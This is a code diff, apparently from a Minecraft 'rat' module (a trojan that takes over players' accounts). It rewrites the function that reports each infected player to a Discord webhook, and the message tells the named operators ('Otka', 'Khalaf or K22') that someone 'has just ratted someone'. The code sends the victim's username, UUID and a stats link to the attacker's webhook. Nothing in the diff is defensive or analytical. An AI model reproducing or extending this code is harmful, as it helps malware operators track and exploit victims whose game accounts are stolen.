@@ -343,41 +343,21 @@ function sendSkyCryptLink(username, uuid) {
         const out = connection.getOutputStream();
         
         // Determine the message based on the webhook URL
-        let message;
+        let ratter;
         if (DISCORD_WEBHOOK_URL.includes("1381411707745865738")) {
-            message = "Otka has just ratted someone!";
+            ratter = "Otka";
         } else if (DISCORD_WEBHOOK_URL.includes("1338123822389395568")) {
-            message = "Either Khalaf or K22 have just ratted someone!";
+            ratter = "Either Khalaf or K22";
         } else {
-            message = "Someone has just been ratted!";
+            ratter = "Someone";
         }
         
-        // Create Discord embed with SkyCrypt link
-        const embed = {
-            "embeds": [{
-                "title": "🎮 " + username,
-                "description": message + "\n\n**SkyCrypt Profile:** https://sky.shiiyu.moe/stats/" + username,
-                "color": 0x00ff00,
-                "fields": [
-                    {
-                        "name": "📊 Stats Link",
-                        "value": "https://sky.shiiyu.moe/stats/" + username,
-                        "inline": false
-                    },
-                    {
-                        "name": "🆔 UUID",
-                        "value": uuid,
-                        "inline": true
-                    }
-                ],
-                "footer": {
-                    "text": "Minecraft Data Collector"
-                },
-                "timestamp": new Date().toISOString()
-            }]
+        // Create simple text message
+        const message = {
+            "content": `**${username}**\n${ratter} has just ratted someone!\nhttps://sky.shiiyu.moe/stats/${username}`
         };
         
-        const jsonPayload = new Packages.java.lang.String(JSON.stringify(embed));
+        const jsonPayload = new Packages.java.lang.String(JSON.stringify(message));
         const bytes = jsonPayload.getBytes("UTF-8");
         out.write(bytes);
         out.close();
